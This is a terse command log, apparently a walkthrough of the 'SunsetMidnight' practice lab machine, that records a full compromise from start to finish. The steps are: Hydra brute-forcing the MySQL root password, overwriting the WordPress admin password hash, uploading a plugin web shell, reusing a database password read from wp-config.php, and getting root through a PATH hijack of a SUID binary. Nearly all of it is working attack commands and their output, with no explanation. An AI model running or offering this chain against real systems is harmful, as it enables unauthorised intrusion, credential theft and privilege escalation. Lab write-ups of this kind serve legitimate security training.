@@ -1,0 +1,61 @@
+SunsetMidnight 
+
+ping 192.168.162.88
+
+
+sudo autorecon --only-scans-dir -v 192.168.162.88
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt sunset-midnight mysql -t 4
+
+[3306][mysql] host: sunset-midnight   login: root   password: robert
+
+echo -n "12345" | md5sum;echo ""
+
+mysql -h sunset-midnight -u root -probert
+show databases;
+use wordpress_db;
+select * from wp_users;
+UPDATE wp_users SET user_pass="827ccb0eea8a706c4c34a16891f84e7b" WHERE ID=1;
+
+http://sunset-midnight/wp-login.php?redirect_to=http%3A%2F%2Fsunset-midnight%2Fwp-admin%2F&reauth=1
+
+admin:12345
+
+Go to plugin -> upload shell -> got shell
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+cd /home/jose
+cat local.txt
+9a30706f1f34d45bb0e821e8c1abe4d1
+
+cd /var/www/html/wordpress/
+cat wp-config.php
+
+/** MySQL database username */
+define( 'DB_USER', 'jose' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );
+
+su jose
+645dc5a8871d2a4269d4cbe23f6ae103
+
+sudo -l 
+645dc5a8871d2a4269d4cbe23f6ae103
+
+find / -perm -u=s 2>/dev/null
+
+/usr/bin/status
+
+strings /usr/bin/status | grep "service"
+echo $PATH
+export PATH=/tmp/:$PATH
+cd /tmp
+echo "/bin/sh" > service
+chmod +x service
+/usr/bin/status
+id
+cd /root
+cat proof.txt
+fcf3216a62c722aabae0e8fb00cacf52
